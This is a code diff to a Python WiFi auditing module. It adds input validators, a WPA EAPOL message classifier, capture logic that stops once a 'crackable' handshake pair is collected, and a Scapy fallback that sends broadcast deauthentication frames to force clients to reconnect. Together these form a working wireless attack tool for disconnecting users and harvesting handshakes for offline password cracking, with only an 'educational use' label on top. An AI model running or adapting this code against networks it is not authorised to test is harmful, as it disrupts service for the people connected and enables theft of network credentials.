@@ -3,6 +3,7 @@ Cyber Command Center - WiFi Auditing Tools
 Module for WiFi security auditing - handshake capture and analysis
 FOR EDUCATIONAL USE ONLY ON YOUR OWN NETWORK
 """
+import struct
 import subprocess
 import platform
 import threading
@@ -29,6 +30,54 @@ CAPTURES_DIR = BASE_DIR / "captures"
 HANDSHAKES_DIR = CAPTURES_DIR / "handshakes"
 WORDLISTS_DIR = BASE_DIR / "wordlists"
 
+# ---------------------------------------------------------------------------
+# Input validation helpers — used by all WiFi modules to prevent command
+# injection when values are passed to subprocess calls.
+# ---------------------------------------------------------------------------
+
+_MAC_RE = re.compile(r'^([0-9A-Fa-f]{2}[:\-]){5}[0-9A-Fa-f]{2}$')
+_IFACE_RE = re.compile(r'^[a-zA-Z0-9_\-\.]{1,32}$')
+_CHANNEL_RE = re.compile(r'^(1[0-4]|[1-9])$')  # channels 1-14
+
+
+def validate_mac(mac: str, allow_broadcast: bool = True) -> str:
+    """
+    Validate and normalise a MAC address.  Raises ValueError on bad input so
+    the caller never forwards untrusted strings to subprocess.
+
+    Returns the MAC in uppercase colon-separated form.
+    """
+    if allow_broadcast and mac.lower() in ('ff:ff:ff:ff:ff:ff', 'ffffffffffff'):
+        return 'FF:FF:FF:FF:FF:FF'
+    # Normalise dashes to colons
+    normalized = mac.replace('-', ':')
+    if not _MAC_RE.match(normalized):
+        raise ValueError(f"Invalid MAC address: {mac!r}")
+    return normalized.upper()
+
+
+def validate_bssid(bssid: str) -> str:
+    """Validate a BSSID (no broadcast allowed)."""
+    return validate_mac(bssid, allow_broadcast=False)
+
+
+def validate_interface(iface: str) -> str:
+    """Validate a network interface name."""
+    if not _IFACE_RE.match(iface):
+        raise ValueError(f"Invalid interface name: {iface!r}")
+    return iface
+
+
+def validate_channel(channel) -> int:
+    """Validate a WiFi channel (1-14)."""
+    try:
+        ch = int(channel)
+    except (TypeError, ValueError):
+        raise ValueError(f"Channel must be an integer, got: {channel!r}")
+    if not 1 <= ch <= 14:
+        raise ValueError(f"Channel {ch} out of range (1-14)")
+    return ch
+
 
 class HandshakeCapture:
     """
@@ -41,13 +90,74 @@ class HandshakeCapture:
         self.is_capturing = False
         self.captured_handshakes = []
         self._capture_thread = None
-        
+        self.current_capture = {}
+        # Optional external deauth callable to avoid circular import:
+        #   set to a function(bssid, client_mac, count) -> bool
+        self._deauth_func = None
+
         # Ensure directories exist
         HANDSHAKES_DIR.mkdir(parents=True, exist_ok=True)
-        
+
         if SCAPY_AVAILABLE:
             conf.verb = 0
     
+    # ------------------------------------------------------------------
+    # WPA 4-way handshake helpers
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _classify_eapol(packet) -> Optional[str]:
+        """
+        Classify an EAPOL Key frame as M1, M2, M3, or M4.
+
+        The WPA/WPA2 4-way handshake Key Information field (2 bytes, big-endian)
+        at offset 5 of the EAPOL body carries these bits:
+          Bit 3  (0x0008) – Key Type  (1 = Pairwise/PTK)
+          Bit 6  (0x0040) – Install
+          Bit 7  (0x0080) – Key ACK
+          Bit 8  (0x0100) – Key MIC
+          Bit 9  (0x0200) – Secure
+
+        Message identification:
+          M1: Key Type=1, ACK=1, MIC=0
+          M2: Key Type=1, ACK=0, MIC=1, Secure=0
+          M3: Key Type=1, ACK=1, MIC=1, Install=1
+          M4: Key Type=1, ACK=0, MIC=1, Secure=1
+
+        Returns 'M1'..'M4' or None if the frame cannot be classified.
+        """
+        try:
+            raw = bytes(packet[EAPOL])
+            # EAPOL header: version(1) type(1) length(2) → body starts at 4
+            # Key body: descriptor_type(1) key_information(2) ...
+            if len(raw) < 8:
+                return None
+            eapol_type = raw[1]
+            if eapol_type != 3:  # 3 = EAPOL-Key
+                return None
+
+            key_info = struct.unpack('!H', raw[5:7])[0]
+            key_type = (key_info >> 3) & 1   # Bit 3
+            install  = (key_info >> 6) & 1   # Bit 6
+            ack      = (key_info >> 7) & 1   # Bit 7
+            mic      = (key_info >> 8) & 1   # Bit 8
+            secure   = (key_info >> 9) & 1   # Bit 9
+
+            if key_type != 1:
+                return None  # Group key exchange – not PTK handshake
+
+            if ack == 1 and mic == 0:
+                return 'M1'
+            if ack == 0 and mic == 1 and secure == 0:
+                return 'M2'
+            if ack == 1 and mic == 1 and install == 1:
+                return 'M3'
+            if ack == 0 and mic == 1 and secure == 1:
+                return 'M4'
+        except Exception:
+            pass
+        return None
+
     def check_requirements(self) -> Dict:
         """Check system requirements for handshake capture"""
         reqs = {
@@ -92,27 +202,31 @@ class HandshakeCapture:
         
         return reqs
     
-    def start_capture(self, target_bssid: str, channel: int, 
-                     output_file: str = None, timeout: int = 300) -> bool:
+    def start_capture(self, target_bssid: str, channel: int,
+                      output_file: str = None, timeout: int = 300) -> bool:
         """
-        Start capturing handshake for a specific network
-        
-        Args:
-            target_bssid: Target AP's BSSID (MAC)
-            channel: WiFi channel
-            output_file: Output file path (optional)
-            timeout: Capture timeout in seconds
+        Start capturing WPA/WPA2 handshake for a specific network.
+
+        A valid handshake for offline cracking requires at minimum M1+M2
+        or M2+M3 from the 4-way exchange.  The old logic merely counted
+        ≥4 EAPOL frames which could be false positives (e.g. group-key
+        rotations).  This version classifies each frame and only marks
+        the handshake complete when crackable message pairs are present.
         """
         if not SCAPY_AVAILABLE:
             raise Exception("Scapy not available")
-        
+
+        # Validate inputs before they reach any subprocess call
+        target_bssid = validate_bssid(target_bssid)
+        channel = validate_channel(channel)
+
         if self.is_capturing:
             return False
-        
+
         if not output_file:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             output_file = HANDSHAKES_DIR / f"handshake_{target_bssid.replace(':', '')}_{timestamp}.pcap"
-        
+
         self.is_capturing = True
         self.current_capture = {
             'target_bssid': target_bssid,
@@ -121,69 +235,72 @@ class HandshakeCapture:
             'start_time': datetime.now(),
             'packets': [],
             'eapol_count': 0,
-            'handshake_complete': False
+            'eapol_messages': {},   # {msg_type: packet}  e.g. {'M1': pkt, 'M2': pkt}
+            'handshake_complete': False,
+            'handshake_messages': []
         }
-        
+
         def packet_handler(packet):
-            """Process captured packets looking for EAPOL"""
             if not self.is_capturing:
                 return
-            
             try:
-                # Check if it's from our target
-                if packet.haslayer(Dot11):
-                    # Get addresses
-                    addr1 = packet.addr1
-                    addr2 = packet.addr2
-                    addr3 = packet.addr3 if hasattr(packet, 'addr3') else None
-                    
-                    target = target_bssid.lower()
-                    
-                    # Check if packet is related to our target
-                    is_target = (
-                        (addr1 and addr1.lower() == target) or
-                        (addr2 and addr2.lower() == target) or
-                        (addr3 and addr3.lower() == target)
-                    )
-                    
-                    if not is_target:
-                        return
-                    
-                    # Check for EAPOL (WPA handshake)
-                    if packet.haslayer(EAPOL):
-                        self.current_capture['packets'].append(packet)
-                        self.current_capture['eapol_count'] += 1
-                        print(f"[+] EAPOL packet captured! Total: {self.current_capture['eapol_count']}")
-                        
-                        # A complete 4-way handshake has 4 EAPOL packets
-                        # But we only need the first 2 or 3 for cracking
-                        if self.current_capture['eapol_count'] >= 4:
-                            self.current_capture['handshake_complete'] = True
-                            print("[+] Complete handshake captured!")
-                            
-            except Exception as e:
+                if not packet.haslayer(Dot11):
+                    return
+
+                # Filter to packets that involve our target BSSID
+                addrs = [
+                    getattr(packet, 'addr1', None),
+                    getattr(packet, 'addr2', None),
+                    getattr(packet, 'addr3', None),
+                ]
+                target = target_bssid.lower()
+                if not any(a and a.lower() == target for a in addrs):
+                    return
+
+                if not packet.haslayer(EAPOL):
+                    return
+
+                # Always store packet for the .pcap file
+                self.current_capture['packets'].append(packet)
+
+                msg_type = self._classify_eapol(packet)
+                if msg_type:
+                    self.current_capture['eapol_messages'][msg_type] = packet
+                    self.current_capture['eapol_count'] += 1
+                    print(f"[+] EAPOL {msg_type} captured "
+                          f"(total={self.current_capture['eapol_count']})")
+
+                    # A handshake is crackable with M1+M2 or M2+M3
+                    seen = set(self.current_capture['eapol_messages'].keys())
+                    if ('M1' in seen and 'M2' in seen) or ('M2' in seen and 'M3' in seen):
+                        self.current_capture['handshake_complete'] = True
+                        self.current_capture['handshake_messages'] = sorted(seen)
+                        print(f"[+] Valid handshake captured! Messages: {seen}")
+
+            except Exception:
                 pass
-        
+
         def capture_thread():
             try:
-                # Capture packets
                 sniff(
                     iface=self.interface,
                     prn=packet_handler,
                     timeout=timeout,
                     store=False,
-                    stop_filter=lambda x: not self.is_capturing or 
-                                          self.current_capture.get('handshake_complete', False)
+                    stop_filter=lambda x: (
+                        not self.is_capturing or
+                        self.current_capture.get('handshake_complete', False)
+                    )
                 )
             except Exception as e:
                 print(f"Capture error: {e}")
             finally:
                 self._save_capture()
-        
+
         self._capture_thread = threading.Thread(target=capture_thread)
         self._capture_thread.daemon = True
         self._capture_thread.start()
-        
+
         return True
     
     def stop_capture(self) -> Dict:
@@ -199,10 +316,11 @@ class HandshakeCapture:
         """Save captured packets to file"""
         if not self.current_capture:
             return {}
-        
+
         result = {
             'target_bssid': self.current_capture.get('target_bssid'),
             'eapol_count': self.current_capture.get('eapol_count', 0),
+            'eapol_messages': self.current_capture.get('handshake_messages', []),
             'handshake_complete': self.current_capture.get('handshake_complete', False),
             'output_file': self.current_capture.get('output_file'),
             'packets_captured': len(self.current_capture.get('packets', []))
@@ -221,23 +339,45 @@ class HandshakeCapture:
         
         return result
     
-    def send_deauth_for_handshake(self, target_bssid: str, 
+    def send_deauth_for_handshake(self, target_bssid: str,
                                    client_mac: str = "ff:ff:ff:ff:ff:ff",
                                    count: int = 5) -> bool:
         """
-        Send deauth packets to force client reconnection (to capture handshake)
+        Send deauth packets to force client reconnection (to capture handshake).
+
+        Uses an optional external callable (_deauth_func) when set, which
+        avoids a circular import with core.deauth.  Falls back to sending
+        frames directly via Scapy so the module stays self-contained.
         """
         if not SCAPY_AVAILABLE:
             return False
-        
+
         try:
-            from core.deauth import WiFiDeauth
-            deauth = WiFiDeauth(self.interface)
-            
-            # Send deauth packets
-            deauth.deauth(client_mac, target_bssid, count=count)
+            # Validate before forwarding to any subprocess/Scapy call
+            target_bssid = validate_bssid(target_bssid)
+            client_mac = validate_mac(client_mac, allow_broadcast=True)
+
+            # Use injected deauth function if available (set by app.py / wifi_audit_routes)
+            if self._deauth_func is not None:
+                return bool(self._deauth_func(target_bssid, client_mac, count))
+
+            # Fallback: build and send the frame directly with Scapy
+            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp  # local import is fine here
+
+            packet = (
+                RadioTap() /
+                Dot11(
+                    type=0,           # Management frame
+                    subtype=12,       # Deauthentication
+                    addr1=client_mac,
+                    addr2=target_bssid,
+                    addr3=target_bssid
+                ) /
+                Dot11Deauth(reason=7)
+            )
+            sendp(packet, iface=self.interface, count=count, inter=0.1, verbose=False)
             return True
-            
+
         except Exception as e:
             print(f"Deauth error: {e}")
             return False
